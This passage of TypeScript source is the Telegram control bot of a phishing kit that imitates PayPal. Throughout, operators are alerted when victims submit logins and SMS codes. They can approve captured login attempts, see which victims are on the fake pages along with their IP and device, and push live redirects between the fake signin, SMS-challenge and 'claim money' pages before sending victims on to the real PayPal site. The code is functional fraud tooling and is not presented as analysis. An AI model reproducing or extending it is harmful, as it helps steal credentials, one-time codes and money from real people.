          console.log(`✅ Full SMS notification sent to ${user.role} ${user.uniqueId}`);
        } else {
          // Send simple notification to regular users
          await sendSimpleUserNotification(user, linkId, "SMS код введен", contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send SMS notification to ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error sending SMS notification:", error);
  }
}

export async function notifySmsPageAccess(
  contextData: string,
  stepupContext: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`📤 Sending SMS page access notification - context: ${contextData}`);
  
  if (!bot) {
    console.log("🚫 Bot not initialized, skipping notification");
    return;
  }

  try {
    let targetUsers: any[] = [];

    // If contextData is provided, find the specific link creator
    if (contextData) {
      console.log(
        "🔍 Looking for SMS page access with contextData:",
        contextData,
      );
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));

      if (links.length > 0) {
        const createdBy = links[0].createdBy;
        targetUsers = await db
          .select()
          .from(telegramUsers)
          .where(
            and(
              eq(telegramUsers.telegramId, createdBy),
              eq(telegramUsers.isApproved, true),
            ),
          );
        console.log("🎯 Found link creator for SMS page:", targetUsers.length);
      }
    }

    // Fallback to all approved users if no specific link creator found
    if (targetUsers.length === 0) {
      targetUsers = await db
        .select()
        .from(telegramUsers)
        .where(eq(telegramUsers.isApproved, true));
      console.log(
        "⚠️ Fallback to all approved users for SMS page:",
        targetUsers.length,
      );
    }

    const message =
      `🔐 Доступ к SMS странице\n\n` +
      `🔗 Context Data:\n<code>${contextData}</code>\n` +
      `📱 Stepup Context:\n<code>${stepupContext}</code>\n` +
      `⏰ Время: ${new Date().toLocaleString("ru-RU")}\n\n` +
      `Одобрить доступ к SMS странице?`;

    // Create a short hash for callback data (Telegram limit is 64 bytes)
    const shortHash = contextData.substring(0, 8);

    // Store mapping of short hash to full contextData
    if (!global.smsHashMap) {
      global.smsHashMap = new Map();
    }
    global.smsHashMap.set(shortHash, contextData);

    // Initialize activeUsers map if not exists
    if (!(global as any).activeUsers) {
      (global as any).activeUsers = new Map();
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✅ Одобрить SMS",
              callback_data: `approve_sms_${shortHash}`,
            },
            {
              text: "❌ Отклонить",
              callback_data: `reject_sms_${shortHash}`,
            },
          ],
        ],
      },
    };

    for (const user of targetUsers) {
      await bot.sendMessage(user.telegramId, message, {
        ...keyboard,
        parse_mode: "HTML",
      });
    }
  } catch (error) {
    console.error("Error sending SMS page access notification:", error);
  }
}

// Handle callback queries (inline button presses)
bot.on("callback_query", async (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message?.chat.id;
  const telegramId = callbackQuery.from.id.toString();

  // Debug logging for specific user
  if (telegramId === "8146147595") {
    console.log(`🔍 DEBUG @Dalsend (${telegramId}) callback:`, {
      data,
      chatId,
      hasMessage: !!message,
      timestamp: new Date().toISOString()
    });
  }

  if (!data || !chatId) return;

  // Allow all callback actions in development mode for testing
  // Development mode is now enabled for full functionality testing

  try {
    // Check if user is approved
    if (!(await isUserApproved(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "У вас нет прав для этого действия",
      });
      return;
    }

    if (data === "enable_redirect") {
      if (!(await isUserAdmin(telegramId))) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "У вас нет прав для этого действия",
        });
        return;
      }

      try {
        const response = await fetch(
          "http://localhost:5000/api/redirect/toggle",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ permanentRedirect: true }),
          },
        );

        if (response.ok) {
          await bot.editMessageText(
            `🔄 Управление переадресацией:\n\n` +
              `📊 Текущий статус: Включена ✅\n\n` +
              `🔴 ВСЕ запросы перенаправляются на PayPal.com\n\n` +
              `ℹ️ При включении переадресации весь трафик будет направляться на PayPal, включая прямой доступ к домену.`,
            {
              chat_id: chatId,
              message_id: message.message_id,
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "❌ Отключить переадресацию",
                      callback_data: "disable_redirect",
                    },
                  ],
                ],
              },
            },
          );

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "✅ Переадресация включена! Весь трафик идет на PayPal.com",
          });
        }
      } catch (error) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка при включении переадресации",
        });
      }
      return;
    }

    if (data === "disable_redirect") {
      if (!(await isUserAdmin(telegramId))) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "У вас нет прав для этого действия",
        });
        return;
      }

      try {
        const response = await fetch(
          "http://localhost:5000/api/redirect/toggle",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ permanentRedirect: false }),
          },
        );

        if (response.ok) {
          await bot.editMessageText(
            `🔄 Управление переадресацией:\n\n` +
              `📊 Текущий статус: Отключена ❌\n\n` +
              `🟢 Сайт работает в обычном режиме\n\n` +
              `ℹ️ При включении переадресации весь трафик будет направляться на PayPal, включая прямой доступ к домену.`,
            {
              chat_id: chatId,
              message_id: message.message_id,
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ Включить переадресацию",
                      callback_data: "enable_redirect",
                    },
                  ],
                ],
              },
            },
          );

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "❌ Переадресация отключена! Сайт работает нормально",
          });
        }
      } catch (error) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка при отключении переадресации",
        });
      }
      return;
    }

    if (data.startsWith("approve_sms_")) {
      const shortHash = data.replace("approve_sms_", "");

      // Get full contextData from hash map
      const contextData = global.smsHashMap?.get(shortHash);

      if (!contextData) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка: данные не найдены",
        });
        return;
      }

      try {
        // Make API call to approve SMS page access
        const response = await fetch(
          `http://localhost:5000/api/sms-page-access/${contextData}/approve`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
          },
        );

        if (response.ok) {
          // Update the message to show approval
          await bot.editMessageText(message.text + "\n\n✅ ОДОБРЕНО", {
            chat_id: chatId,
            message_id: message.message_id,
            reply_markup: { inline_keyboard: [] },
          });

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "SMS страница одобрена!",
          });
        } else {
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "Ошибка при одобрении SMS страницы",
          });
        }
      } catch (error) {
        console.error("Error approving SMS page access:", error);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка при одобрении SMS страницы",
        });
      }
    } else if (data.startsWith("approve_")) {
      const loginAttemptIdStr = data.replace("approve_", "");
      const loginAttemptId = parseInt(loginAttemptIdStr);

      console.log("🔍 Callback data:", data);
      console.log("🔍 Extracted ID string:", loginAttemptIdStr);
      console.log("🔍 Parsed ID:", loginAttemptId);

      if (isNaN(loginAttemptId)) {
        console.error("❌ Invalid login attempt ID:", loginAttemptIdStr);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка: неверный ID попытки входа",
        });
        return;
      }

      // Approve the login attempt
      await storage.approveLoginAttempt(loginAttemptId);

      // Update the message to show approval
      await bot.editMessageText(message.text + "\n\n✅ ОДОБРЕНО", {
        chat_id: chatId,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "Вход одобрен!",
      });
    } else if (data.startsWith("reject_")) {
      const loginAttemptIdStr = data.replace("reject_", "");
      const loginAttemptId = parseInt(loginAttemptIdStr);

      console.log("🔍 Reject callback data:", data);
      console.log("🔍 Extracted reject ID string:", loginAttemptIdStr);
      console.log("🔍 Parsed reject ID:", loginAttemptId);

      if (isNaN(loginAttemptId)) {
        console.error("❌ Invalid reject login attempt ID:", loginAttemptIdStr);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка: неверный ID попытки входа",
        });
        return;
      }

      // Delete the login attempt
      await storage.deleteLoginAttempt(loginAttemptId);

      // Update the message to show rejection
      await bot.editMessageText(message.text + "\n\n❌ ОТКЛОНЕНО", {
        chat_id: chatId,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "Вход отклонен!",
      });
    } else if (data.startsWith("links_page_")) {
      // Handle pagination: links_page_pageNumber_telegramId
      const parts = data.split("_");
      if (parts.length >= 4) {
        const pageNumber = parseInt(parts[2]);
        const targetUserId = parts[3];

        // Delete the current message and show new page
        try {
          await bot.deleteMessage(
            chatId,
            callbackQuery.message?.message_id || 0,
          );
          await showUserLinks(chatId, targetUserId, pageNumber);
          await bot.answerCallbackQuery(callbackQuery.id);
        } catch (error) {
          console.error("Error handling pagination:", error);
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "Ошибка при переключении страницы",
          });
        }
      }
    } else if (data.startsWith("delete_page_")) {
      // Handle page deletion: delete_page_pageNumber_telegramId
      const parts = data.split("_");
      if (parts.length >= 4) {
        const pageNumber = parseInt(parts[2]);
        const targetUserId = parts[3];

        try {
          // Get user's links for the specific page
          const links = await db
            .select()
            .from(telegramLinks)
            .where(eq(telegramLinks.createdBy, targetUserId))
            .orderBy(desc(telegramLinks.createdAt));

          const LINKS_PER_PAGE = 3;
          const startIndex = pageNumber * LINKS_PER_PAGE;
          const endIndex = startIndex + LINKS_PER_PAGE;
          const pageLinks = links.slice(startIndex, endIndex);

          // Delete all links on this page
          for (const link of pageLinks) {
            await db
              .delete(telegramLinks)
              .where(eq(telegramLinks.linkId, link.linkId));
          }

          await bot.editMessageText(
            `🗑 Удалено ${pageLinks.length} ссылок со страницы ${pageNumber + 1}`,
            {
              chat_id: chatId,
              message_id: callbackQuery.message?.message_id,
              reply_markup: { inline_keyboard: [] },
            },
          );

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: `Удалено ${pageLinks.length} ссылок!`,
          });
        } catch (error) {
          console.error("Error deleting page:", error);
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: "Ошибка при удалении страницы",
          });
        }
      }
    } else if (data.startsWith("delete_all_user_links_")) {
      // Handle mass deletion: delete_all_user_links_telegramId
      const targetUserId = data.replace("delete_all_user_links_", "");

      try {
        // Count links before deletion
        const links = await db
          .select()
          .from(telegramLinks)
          .where(eq(telegramLinks.createdBy, targetUserId));

        const linkCount = links.length;

        // Delete all user's links
        await db
          .delete(telegramLinks)
          .where(eq(telegramLinks.createdBy, targetUserId));

        await bot.editMessageText(
          `🗑💥 Удалено всего ${linkCount} ссылок!\n\nВсе ваши ссылки полностью очищены.`,
          {
            chat_id: chatId,
            message_id: callbackQuery.message?.message_id,
            reply_markup: { inline_keyboard: [] },
          },
        );

        await bot.answerCallbackQuery(callbackQuery.id, {
          text: `Удалено ${linkCount} ссылок!`,
        });
      } catch (error) {
        console.error("Error deleting all links:", error);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка при удалении всех ссылок",
        });
      }
    } else if (data.startsWith("delete_link_")) {
      // Extract link ID from callback data
      const linkId = data.replace("delete_link_", "");

      try {
        // Delete the link from database
        await db.delete(telegramLinks).where(eq(telegramLinks.linkId, linkId));

        // Update the message to show link deleted
        await bot.editMessageText(`🗑 Ссылка ${linkId} удалена`, {
          chat_id: chatId,
          message_id: callbackQuery.message?.message_id,
          reply_markup: { inline_keyboard: [] },
        });

        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ссылка удалена!",
        });
      } catch (error) {
        console.error("Error deleting link:", error);
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка при удалении ссылки",
        });
      }
    } else if (data.startsWith("reject_sms_")) {
      const shortHash = data.replace("reject_sms_", "");

      // Update the message to show rejection
      await bot.editMessageText(message.text + "\n\n❌ ОТКЛОНЕНО", {
        chat_id: chatId,
        message_id: message.message_id,
        reply_markup: { inline_keyboard: [] },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "SMS страница отклонена!",
      });
    } else if (data.startsWith("send_email_")) {
      const shortHash = data.replace("send_email_", "");

      // Get full contextData from mapping
      let contextData = (global as any).checkHashMap?.get(shortHash);
      
      // If contextData not found in hash map, try to find it in database
      if (!contextData && shortHash !== "direct") {
        try {
          const links = await db.select().from(telegramLinks).where(
            sql`${telegramLinks.contextData} LIKE ${shortHash + '%'}`
          );
          if (links.length > 0) {
            contextData = links[0].contextData;
            console.log(`🔄 Recovered contextData for send_email: ${contextData}`);
          }
        } catch (error) {
          console.error("Error recovering contextData for send_email:", error);
        }
      }
      
      if (!contextData) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка: ссылка не найдена",
        });
        return;
      }

      // Find the link with this contextData
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));

      if (links.length === 0) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ссылка не найдена",
        });
        return;
      }

      // Store the contextData for the email process
      userStates.set(telegramId, {
        state: "awaiting_email",
        data: { contextData, shortHash },
      });

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "Введите email получателя",
      });

      await bot.sendMessage(
        chatId,
        "📧 Введите email адрес получателя для отправки уведомления о платеже:",
        cancelKeyboard,
      );
    } else if (data.startsWith("check_users_")) {
      const shortHash = data.replace("check_users_", "");

      // Get full contextData from mapping
      let contextData = (global as any).checkHashMap?.get(shortHash);
      
      // If contextData not found in hash map, try to find it in database
      if (!contextData && shortHash !== "direct") {
        try {
          const links = await db.select().from(telegramLinks).where(
            sql`${telegramLinks.contextData} LIKE ${shortHash + '%'}`
          );
          if (links.length > 0) {
            contextData = links[0].contextData;
            console.log(`🔄 Recovered contextData for check_users: ${contextData}`);
          }
        } catch (error) {
          console.error("Error recovering contextData for check_users:", error);
        }
      }
      
      if (!contextData) {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "Ошибка: ссылка не найдена",
        });
        return;
      }

      // Check active users for this link
      const activeUsers = (global as any).activeUsers || new Map();
      const currentTime = Date.now();
      const twoMinutesAgo = currentTime - 2 * 60 * 1000; // Reduced to 2 minutes for better accuracy

      // Clean up old entries first
      for (const [key, userData] of activeUsers) {
        if (userData.timestamp < twoMinutesAgo) {
          activeUsers.delete(key);
        }
      }

      // Find active users on this link
      let activeCount = 0;
      let activeDetails = "";

      for (const [userContextData, userData] of activeUsers) {
        if (
          userContextData === contextData &&
          userData.timestamp > twoMinutesAgo
        ) {
          activeCount++;
          const timeAgo = Math.round(
            (currentTime - userData.timestamp) / 1000 / 60,
          );
          const deviceInfo = parseUserAgent(userData.userAgent);
          activeDetails += `👤 ${translatePageName(userData.page)}\n`;
          activeDetails += `⏰ ${timeAgo === 0 ? "<1" : timeAgo} мин назад\n`;
          activeDetails += `📱 ${deviceInfo.device} | ${deviceInfo.browser}\n`;
          activeDetails += `🌍 ${userData.ip}\n\n`;
        }
      }

      let responseText;
      if (activeCount > 0) {
        responseText = `👤 Активные пользователи (${activeCount}):\n\n${activeDetails.substring(0, 180)}`; // Telegram limit 200 chars
      } else {
        responseText = "❌ Мамонта нет на сайте";
      }

      await bot.answerCallbackQuery(callbackQuery.id, {
        text: responseText,
        show_alert: true,
      });
    } else if (data.startsWith("redirect_")) {
      // Handle redirect buttons: redirect_shortHash_page
      console.log(`🔄 Redirect button pressed by ${telegramId}: ${data}`);
      const parts = data.split("_");
      if (parts.length >= 3) {
        const shortHash = parts[1];
        // Handle multi-word pages like sms_loading
        const page = parts.length === 4 ? `${parts[2]}_${parts[3]}` : parts[2];
        
        console.log(`🔄 Redirect details: shortHash=${shortHash}, page=${page}`);

        // Get full contextData from hash map
        let contextData = (global as any).redirectHashMap?.get(shortHash);
        console.log(`🔄 ContextData from hash map: ${contextData}`);
        
        // Debug: Show entire hash map content
        if (telegramId === "8146147595" && (global as any).redirectHashMap) {
          console.log(`🔍 DEBUG @Dalsend entire redirectHashMap:`, Array.from((global as any).redirectHashMap.entries()));
        }
        
        // If contextData not found in hash map, try to find it in database by shortHash
        if (!contextData && shortHash !== "direct") {
          try {
            const links = await db.select().from(telegramLinks).where(
              sql`${telegramLinks.contextData} LIKE ${shortHash + '%'}`
            );
            if (links.length > 0) {
              contextData = links[0].contextData;
              console.log(`🔄 Recovered contextData from database: ${contextData}`);
            }
          } catch (error) {
            console.error("Error recovering contextData:", error);
          }
        }

        let redirectPath = "/";
        let pageName = "Основная страница";

        switch (page) {
          case "home":
            // Use contextData to construct the payment page URL
            if (contextData) {
              try {
                const links = await db.select().from(telegramLinks).where(
                  eq(telegramLinks.contextData, contextData)
                );
                if (links.length > 0) {
                  redirectPath = links[0].generatedLink;
                  console.log(`🔄 Redirect to payment page: ${redirectPath}`);
                } else {
                  redirectPath = "/";
                }
              } catch (error) {
                console.error("Error getting payment link:", error);
                redirectPath = "/";
              }
            } else {
              redirectPath = "/";
            }
            pageName = "Основная страница";
            break;
          case "signin":
            redirectPath = "/signin";
            pageName = "Ввод данных";
            break;
          case "loading":
            redirectPath = "/signin?showLoading=true";
            pageName = "Загрузка";
            break;
          case "sms_loading":
            redirectPath = "/signin?showSmsLoading=true";
            pageName = "Пуш";
            break;
          case "sms":
            redirectPath = `/authflow/challenges/softwareToken/?context_data=${contextData}`;
            pageName = "СМС";
            break;
          case "fullscreen":
            redirectPath = "/signin?showFullscreen=true";
            pageName = "Just a second";
            break;
          case "paypal":
            redirectPath = "https://paypal.com";
            pageName = "PayPal";
            break;
        }

        // Always set user state and send URL, regardless of connection status
        try {
          // Store the redirect state in database for user state management
          await fetch("http://localhost:5000/api/user-state", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              contextData: contextData || "direct",
              page: page,
            }),
          });

          // Determine redirect URL based on page type
          let redirectUrl = "/";

          switch (page) {
            case "home":
              // Find the original generated link for this context_data
              if (contextData) {
                const links = await db
                  .select()
                  .from(telegramLinks)
                  .where(eq(telegramLinks.contextData, contextData));
                console.log(`🔍 DEBUG: Found links for contextData ${contextData}:`, links.length);
                if (links.length > 0 && links[0].generatedLink) {
                  // Use the stored generated link directly
                  redirectUrl = links[0].generatedLink;
                  console.log(`🔗 DEBUG: Using stored link: ${redirectUrl}`);
                } else {
                  redirectUrl = `/myaccount/transfer/claim-money?context_data=${contextData}`;
                  console.log(`🔗 DEBUG: Using fallback link: ${redirectUrl}`);
                }
              } else {
                redirectUrl = `/`;
                console.log(`🔗 DEBUG: No contextData, using root: ${redirectUrl}`);
              }
              break;
            case "signin":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}`
                : `/signin`;
              break;
            case "sms":
              redirectUrl = contextData
                ? `/authflow/challenges/softwareToken/?context_data=${contextData}&direct_access=true`
                : `/authflow/challenges/softwareToken/`;
              break;
            case "loading":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}&showLoading=true`
                : `/signin?showLoading=true`;
              break;
            case "sms_loading":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}&showSmsLoading=true`
                : `/signin?showSmsLoading=true`;
              break;
            case "fullscreen":
              redirectUrl = contextData
                ? `/signin?context_data=${contextData}&showFullscreen=true`
                : `/signin?showFullscreen=true`;
              break;
            case "paypal":
              redirectUrl = "https://paypal.com";
              break;
          }

          // Send redirect command via WebSocket to connected users
          const userConnections = (global as any).userConnections;
          let userRedirected = false;

          // Debug logging for @Dalsend
          if (telegramId === "8146147595") {
            console.log(`🔍 DEBUG @Dalsend redirect attempt:`, {
              contextData,
              hasUserConnections: !!userConnections,
              hasConnection: userConnections && contextData && userConnections.has(contextData),
              redirectUrl,
              action: parts[1]
            });
          }

          if (
            userConnections &&
            contextData &&
            userConnections.has(contextData)
          ) {
            const ws = userConnections.get(contextData);
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(
                JSON.stringify({
                  type: "redirect",
                  url: redirectUrl,
                }),
              );
              userRedirected = true;
              
              // Debug logging for @Dalsend
              if (telegramId === "8146147595") {
                console.log(`✅ @Dalsend redirect sent successfully to ${contextData}`);
              }
            } else if (telegramId === "8146147595") {
              console.log(`❌ @Dalsend WebSocket not open for ${contextData}, readyState: ${ws.readyState}`);
            }
          } else if (telegramId === "8146147595") {
            console.log(`❌ @Dalsend no connection found for ${contextData}`);
            console.log(`🔍 DEBUG @Dalsend available connections:`, userConnections ? Array.from(userConnections.keys()) : 'none');
          }

          // Send redirect notification to original link creator
          if (contextData) {
            const workerUser = await db
              .select()
              .from(telegramUsers)
              .where(eq(telegramUsers.telegramId, telegramId));
            
            const workerName = workerUser.length > 0 ? workerUser[0].uniqueId : "Вбивер";
            await notifyRedirectAction(contextData, page, workerName);
          }

          // Always show success message regardless of connection status
          const statusMessage = userRedirected
            ? `✅ ${pageName} - Пользователь перенаправлен`
            : `✅ ${pageName} - Перенаправление установлено`;

          await bot.answerCallbackQuery(callbackQuery.id, {
            text: statusMessage,
            show_alert: true,
          });
        } catch (error) {
          console.error("Error setting redirect:", error);
          await bot.answerCallbackQuery(callbackQuery.id, {
            text: `❌ Ошибка установки перенаправления`,
            show_alert: true,
          });
        }
      }
    } else if (data.startsWith("refresh_page_")) {
      // Handle refresh page button
      const shortHash = data.replace("refresh_page_", "");
      
      // Get full contextData from hash map
      let contextData = (global as any).redirectHashMap?.get(shortHash) || 
                       (global as any).checkHashMap?.get(shortHash);
      
      if (!contextData) {
        // Try to find contextData in database by shortHash
        try {
          const results = await db
            .select()
            .from(telegramLinks)
            .where(like(telegramLinks.contextData, `${shortHash}%`));
          
          if (results.length > 0) {
            contextData = results[0].contextData;
          }
        } catch (error) {
          console.error("Error searching for contextData:", error);
        }
      }
      
      if (contextData) {
        // Send refresh command via WebSocket to connected users
        const userConnections = (global as any).userConnections;
        let userRefreshed = false;
        
        if (userConnections && userConnections.has(contextData)) {
          const ws = userConnections.get(contextData);
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({
              type: "refresh",
              message: "Страница обновлена админом"
            }));
            userRefreshed = true;
          }
        }
        
        const statusMessage = userRefreshed
          ? "🔄 Страница обновлена для пользователя"
          : "🔄 Команда обновления отправлена";
        
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: statusMessage,
          show_alert: true,
        });
      } else {
        await bot.answerCallbackQuery(callbackQuery.id, {
          text: "❌ Не удалось найти данные для обновления",
          show_alert: true,
        });
      }
    }
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.answerCallbackQuery(callbackQuery.id, {
      text: "Произошла ошибка",
    });
  }

  // User Management Callbacks
  if (data.startsWith("users_list_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    const parts = data.split("_");
    const role = parts[2];
    const page = parts[3] ? parseInt(parts[3]) : 1;

    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserList(chatId, role, page);
    return;
  }

  if (data === "manage_users" || data === "user_management_refresh") {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserManagement(chatId, telegramId);
    return;
  }

  if (data === "main_menu") {
    await bot.answerCallbackQuery(callbackQuery.id);
    
    const keyboard = (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard;
    await bot.sendMessage(chatId, "🏠 Главное меню:", { reply_markup: keyboard });
    return;
  }

  // User management actions
  if (data === "user_add") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserAddForm(chatId, telegramId);
    return;
  }

  if (data === "user_delete") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserDeleteForm(chatId, telegramId);
    return;
  }

  if (data === "user_promote_worker") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserPromoteForm(chatId, telegramId);
    return;
  }

  if (data === "user_demote_user") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserDemoteForm(chatId, telegramId);
    return;
  }

  if (data === "user_block") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserBlockForm(chatId, telegramId);
    return;
  }

  if (data === "user_unblock") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserUnblockForm(chatId, telegramId);
    return;
  }

  // User action callbacks
  if (data.startsWith("delete_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    const userToDelete = data.split("_")[2];
    await deleteUser(chatId, telegramId, userToDelete);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("promote_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    const userToPromote = data.split("_")[2];
    await promoteUser(chatId, telegramId, userToPromote);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("demote_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    const userToDemote = data.split("_")[2];
    await demoteUser(chatId, telegramId, userToDemote);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("block_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    const userToBlock = data.split("_")[2];
    await blockUser(chatId, telegramId, userToBlock);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  if (data.startsWith("unblock_user_")) {
    if (!(await isUserAdmin(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "❌ У вас нет прав доступа.",
      });
      return;
    }

    const userToUnblock = data.split("_")[2];
    await unblockUser(chatId, telegramId, userToUnblock);
    await bot.answerCallbackQuery(callbackQuery.id);
    return;
  }

  // User management refresh
  if (data === "user_management_refresh") {
    await bot.answerCallbackQuery(callbackQuery.id);
    await showUserManagement(chatId, telegramId);
    return;
  }
});

// Get country flag emoji
function getCountryFlag(country: string): string {
  const flagMap: { [key: string]: string } = {
    Germany: "🇩🇪",
    Russia: "🇷🇺",
    "United States": "🇺🇸",
    France: "🇫🇷",
    "United Kingdom": "🇬🇧",
    Italy: "🇮🇹",
    Spain: "🇪🇸",
    Netherlands: "🇳🇱",
    Poland: "🇵🇱",
    Ukraine: "🇺🇦",
    Belarus: "🇧🇾",
    Kazakhstan: "🇰🇿",
    China: "🇨🇳",
    Japan: "🇯🇵",
    Turkey: "🇹🇷",
    Brazil: "🇧🇷",
    Canada: "🇨🇦",
    Australia: "🇦🇺",
    India: "🇮🇳",
    Mexico: "🇲🇽",
  };

  return flagMap[country] || "🌍";
}

// Translate page names
function translatePageName(page: string): string {
  const translations: { [key: string]: string } = {
    "Payment Page": "Основная страница",
    "Login Page": "Ввод данных",
    "SMS Challenge Page": "Пуш & Смс",
  };

  return translations[page] || page;
}

// Parse user agent to extract detailed device info
function parseUserAgent(ua: string) {
  if (!ua) return { device: "Unknown", browser: "Unknown", os: "Unknown" };

  let device = "PC";
  let browser = "Unknown";
  let os = "Unknown";

  // Device detection
  if (ua.includes("iPhone")) {
    device = "iPhone";
    const match = ua.match(/OS (\d+)_(\d+)/);
    os = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
  } else if (ua.includes("iPad")) {
    device = "iPad";
    const match = ua.match(/OS (\d+)_(\d+)/);
    os = match ? `iPadOS ${match[1]}.${match[2]}` : "iPadOS";
  } else if (ua.includes("Android")) {
    device = "Android";
    const match = ua.match(/Android (\d+\.?\d*)/);
    os = match ? `Android ${match[1]}` : "Android";
  } else if (ua.includes("Windows NT")) {
    device = "PC";
    const match = ua.match(/Windows NT (\d+\.\d+)/);
    if (match) {
      const version = match[1];
      if (version === "10.0") os = "Windows 10";
      else if (version === "6.3") os = "Windows 8.1";
      else if (version === "6.1") os = "Windows 7";
      else os = `Windows ${version}`;
    } else {
      os = "Windows";
    }
  } else if (ua.includes("Mac OS X")) {
    device = "Mac";
    const match = ua.match(/Mac OS X (\d+[_\.]\d+)/);
    os = match ? `macOS ${match[1].replace("_", ".")}` : "macOS";
  } else if (ua.includes("Linux")) {
    device = "PC";
    os = "Linux";
  }

  // Browser detection
  if (ua.includes("Chrome/") && !ua.includes("Edge")) {
    const match = ua.match(/Chrome\/(\d+)/);
    browser = match ? `Chrome ${match[1]}` : "Chrome";
  } else if (ua.includes("Firefox/")) {
    const match = ua.match(/Firefox\/(\d+)/);
    browser = match ? `Firefox ${match[1]}` : "Firefox";
  } else if (ua.includes("Safari/") && !ua.includes("Chrome")) {
    const match = ua.match(/Version\/(\d+\.?\d*)/);
    browser = match ? `Safari ${match[1]}` : "Safari";
  } else if (ua.includes("Edge/")) {
    const match = ua.match(/Edge\/(\d+)/);
    browser = match ? `Edge ${match[1]}` : "Edge";
  }

  return { device, browser, os };
}

// Get geolocation data from IP address
async function getGeolocation(ip: string) {
  try {
    // Extract the first (real) IP address if multiple IPs are provided
    let realIp = ip;
    if (ip.includes(",")) {
      // Take the first IP address (usually the real client IP)
      realIp = ip.split(",")[0].trim();
    }

    // Skip localhost and private IPs
    if (
      realIp === "unknown" ||
      realIp === "127.0.0.1" ||
      realIp === "::1" ||
      realIp.startsWith("192.168.") ||
      realIp.startsWith("10.") ||
      realIp.startsWith("172.")
    ) {
      return {
        country: "Local/Private",
        city: "Unknown",
      };
    }

    console.log(`🔍 Getting geolocation for IP: ${realIp}`);

    // Use free IP-API service with only needed fields
    const response = await fetch(
      `http://ip-api.com/json/${realIp}?fields=status,country,city`,
    );
    const data = await response.json();

    console.log(`📍 Geolocation response:`, data);

    if (data.status === "success") {
      return {
